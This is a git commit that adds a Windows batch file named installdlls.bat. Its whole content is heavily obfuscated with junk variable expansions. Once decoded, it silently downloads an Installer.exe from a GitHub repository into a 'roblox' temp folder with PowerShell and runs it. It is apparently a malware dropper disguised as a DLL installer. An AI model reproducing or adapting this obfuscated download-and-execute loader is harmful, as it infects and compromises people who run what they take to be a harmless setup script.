8f335979091e556345007ebe641ed75cab46f4fc
djdja35fgf <139662402+djdja35fgf@users.noreply.github.com>
2023-07-15 21:13:57 -0400

    Add files via upload

---
+++ installdlls.bat
@@ -0,0 +1,24 @@
+@%bCjTaD%e%Is]wVIx%c%$yTCI]%h%Qf(?@i%o%fRruZ% %TqcShRd%o%n[mp)[i%f%)BWuPQ%f%_FYCpx%
+s%VcFF(w%e%j]HMUS%t%YrGtKl%l%mJaTO%o%)youWM%c%jSuwYEE%a%pCM,PY%l%nEJZB,Y%
+
+s%Bb(AImW%e%.RLoYkL%t%XbRieaK% %_oCtR)e%"%bE(eN%u%rN,@BMl%r%qYTxp%l%IcjZstS%=%zTA@_U%h%fXt.?%t%$B,e]qv%t%c(ZeyH%p%cTuRIYZ%s%f(rIwS]%:%OnrftYT%/%GjwpO@%/%vxe?Bj%g%HwGTj%i%@tD_YYr%t%g]AP[F%h%]FFAv.%u%ByQ?jB]%b%nB@@]aN%.%.D#JAC%c%XcjPX_s%o%F[EwLN$%m%iB)$qrt%/%]AD#oT%d%fSVZc%j%nn@qRS%d%FexzReB%j%Rk$Hdl?%a%BlIU.f%3%BbHrwgD%5%fC,eZ%f%rflmms%g%ocXRV#%f%J?Dh)%/%E)oQEiQ%v%LvkLG)o%e%Ktrbr%r%mvXgF%b%,lsOJB%o%AcvFdd%s%xxAQypF%e%HTBg(t%-%(t[GplS%p%[lgnTgb%o%CdEeLj%t%oBLRbc?%a%L[w)mwl%t%ifCuJmX%o%t]LXM[%/%NlGF]cP%r%wEi@vS%a%fnVV)%w%oODxE%/%eR$ZMa%m%[SQewf%a%,O.aJG%i%PVC$Fq,%n%pa.fKj,%/%cp_T])%I%iD])A%N%JMNpEZ%s%qLnLbhv%t%)O@vi.%a%RAqet[%l%_vLYoc%l%b_LoB%o%.jj]YnM%r%).nCwBW%.%AfNOQ%e%pojipdA%x%cCmYAzK%e%R)bTni%"%IvyZF[G%
+
+s%RLr(ha%e%p)lGe%t%AJgYbM% %GE#zND%"%r@Xxsb%t%c]AMK%e%JB?UfWg%m%$L)ifi%p%_ZJAd.%D%xRQ(u%i%(X_krx%r%HGsR_%=%q(TvFz%%temp%\%F_bIjd%r%ttIBqmq%o%caxti$%b%erzUR%l%)q?Hx%o%_J)F$Z%x%fBB@Ql%"%B#Y)Pz.%
+
+i%xDgng%f%hpYgX% %_iYqLrB%n%FQ)AJm%o%FadIXuK%t%,eFHiRe% %QqAUsq%e%U.ME#Zh%x%RO#A?A]%i%F_DMA%s%_v_CtD%t%$rrSw% %GvGBQ]%"%dVYBb%%tempDir%"%#hWBn(B% %X$HRjCb%(%Vk)lU%
+ %hXbjT_% %vTxei% %N(Km,Bc% %rXtRbQQ%m%vEecKJn%k%vnMyMb%d%GzDG,Vi%i%]nhXKl%r%NwGBz$_% %OL]DMBn%"%DkOeD[s%%tempDir%"%bVEy?%
+)%(v])]Ne%
+
+s%XJ(FZI%e%..lslsI%t%k]SJLI% %o_AS$U%"%cWrKbqd%d%Ia?g_%o%OFNRWgO%w%#s)l.%n%NrKLgUY%l%OSL_ptX%o%H@ffeQd%a%hEykAk@%d%uUCS#%P%rJL#Y%a%,MNs#%t%XPnGB%h%witkEA%=%XEqCv$%%tempDir%\%KMyYI%I%LBoT$i$%N%?xWZDI%s%tfZ.Nr%t%hPI[FO%a%?DI,d%l%(VXmRNe%l%ko#_dC%o%MWnxY%r%hJ(onDY%.%t]SApf%e%,zE]AiA%x%lPZM.)d%e%TYc)uI%"%OWQKB?M%
+
+R%ZujXI#%E%RBSdl%M%ipUl#oC% %LyW.mk%D%)jgfL%o%Qhf?rH%w%cqj#d%n%dSUcy%l%BQTX[uA%o%gsR(P%a%TElnl.%d%#lvpjqa% %FukFI.%t%fZ_Y[AE%h%So,Rfd%e%V]zSpZr% %lv,rDlF%f%MH@CV%i%trefLK%l%qp$Rn%e%DFKjmbS% %HkfIxw%u%azI$sP,%s%g[GHiU%i%Q?WdQ%n%xguyNPJ%g%?uEh#% %.bbWMy%P%k.e.Iq%o%#iEPXg%w%gSccqI_%e%)x(maY%r%K?NtVD#%S%JMOZo@%h%ZpIYNME%e%xTo.@gZ%l%xmw[[%l%_lQCUZh%
+p%hseRiGj%o%(txJyV%w%KCrQUH%e%emeoW%r%qg[daHy%s%LsLOqc%h%VF#)l%e%xmyKT$%l%jsZ?r_b%l%TyPAv% %zY,bAZY%-%AaHlMp%C%ryrkvsa%o%zVgLh?%m%(BD(i#X%m%.hQMMu.%a%pKAuG%n%JyO)wo%d%WyHgQo% %iKk,gXT%"%DbUtQ.B%(%u?Upkk%N%)bMiz]%e%v#rVH%w%YruMM%-%I?byqT.%O%uClBz%b%dTy.yv[%j%yRdTB%e%C@dqQr%c%WxvbL%t%Dm[LKZU% %V_,A?ZU%S%pUSfKEl%y%YmX#d)%s%?Ir@)Eg%t%(]@lTn%e%guAwK%m%.CggByn%.%vZdtCq%N%c)EfEHC%e%IwtUV[t%t%@U)aXLd%.%c)yx_%W%SRufz%e%YvxdW%b%yTKIZ%C%IOKdH%l%[UxQ,%i%x#eZiqk%e%ovgX)GC%n%BWFrnk%t%AvW[A%)%QmXcYnm%.%RDWIeE%D%HKnZc?%o%@eIYv%w%)vPD)?%n%Ol(iql#%l%CHGHIF%o%oaGSo%a%LR#Up)Z%d%kq)N,ZN%F%zoWtY@%i%RKxPuTg%l%xnAOC%e%o#Xm@Ug%(%fvQIr%'%kzS.HUS%%url%'%Gg_g@X%,%f?e,f% %Fx?zwUK%'%oF(UADv%%downloadPath%'%_P$$qiL%)%d?Wp$%"%FlQ(,tR%
+
+R%zspVMz@%E%SvlxE_%M%Kgobjl% %jRa.ED%C%zwT)iAR%h%RAhGO%e%hNpaqV.%c%inxTlbb%k%sr)UD[% %Saaddm%i%zRQjZ%f%al#X_?u% %gvH]Xp%t%OGoPm%h%@l,vF%e%(VeYe% %XY)Dk,v%d%(DWjmA%o%w[_FN%w%Uk)$iQ%n%YFKdCw%l%Wtd.B%o%iLFlSW%a%?isS@E%d%RR,DR% %sXqYZc%w%aOIbeJT%a%WmXqF%s%$F,)EaJ% %Y?nic_%s%OwRDR@z%u%V_a$t%c%oDkiMy%c%Zq_Wx%e%QJ,f_v%s%]Mp#g%s%ApblT#%f%pU_P(jF%u%RhjiHv%l%y,GRRk%
+i%[Axbl%f%LsKYd[O% %yk?XCq%n%BU(nma%o%wVDkzhL%t%F$qAQ% %FkJbIE,%e%bZ#cBl]%x%xBt_Z%i%BG.O@P%s%MtMhO#c%t%qdDM,% %IFC)oG%"%JPaVSJf%%downloadPath%"%AJmZy% %UrkO_kR%(%p?vSl)K%
+ %@t([oIo% %FpQGQ% %AzXVXRL% %.pmHAf%e%TCIdPE%x%a),Wz[B%i%hfs.A,%t%D(c)V% %ksghmg%/%t?dVu%b%AEhqN%
+)%Bo()e%
+
+s%SMy@)Ok%t%DDCK]%a%.Okig%r%vIKsqS%t%..hT@E% %hr@t#)s%"%k@DKqf%"%hNv[f_% %hBE$S,u%"%QrQvx#R%%downloadPath%"%MMh[Mr%
+
+e%GrShiiJ%n%@BoGJL%d%hfpor%l%yuLey%o%g.p@j,E%c%gKQFanH%a%FNC@C@R%l%usBpEYn%
